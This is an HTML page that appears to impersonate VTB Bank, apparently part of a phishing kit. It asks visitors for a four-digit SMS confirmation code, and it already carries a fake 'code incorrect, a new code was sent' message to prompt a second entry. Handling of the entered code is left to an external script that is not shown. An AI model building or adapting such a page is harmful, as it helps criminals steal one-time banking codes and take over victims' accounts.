<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&family=Roboto:wght@300;400&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/kod.css">
    <title>Подтверждение личности - Банк ВТБ</title>
</head>
<body>
    <div class="wrap">
        <header class="logo">
            <img src="Image/logo.png" alt="Лого ВТБ">
        </header>
    </div>
    <section id="form">
        <div class="wrap">
            <div class="form-text">
                ДЛЯ ПОДТВЕРЖДЕНИЯ ЛИЧНОСТИ, <br>
                ВВЕДИТЕ КОД ИЗ СМС  
            </div>
            <div class="number-card">
                <p class="text-number">Введите номер код из СМС:</p>
                <p id="nokode">Код не верный! Был выслан повторный код </p>
                <form action="" onsubmit="return false;">
                    <input type="text" placeholder="Код" required maxlength="4" minlength="4">
                    <div class="but">
                        <button onclick="message()">ОТПРАВИТЬ КОД</button>
                    </div>
                </form>
            </div>
        </div>
    </section>
    <footer>
        <div class="wrap">
            <div class="info">
                <img src="Image/logo.png" class="banklogo"alt="">
                <p>2020 Все права защищены</p>
                <img src="Image/cardlogo.png" class="cardlogo"alt="">
            </div>
            <div class="info-mob">
                <p>2020 Все права защищены</p>
                <div class="logoinfo-mob">
                    <img src="Image/logo.png" class="banklogo"alt="">
                    <img src="Image/cardlogo.png" class="cardlogo"alt="">
                </div>
            </div>
        </div>
    </footer>
    <script src="js/script.js"></script>
</body>
</html>
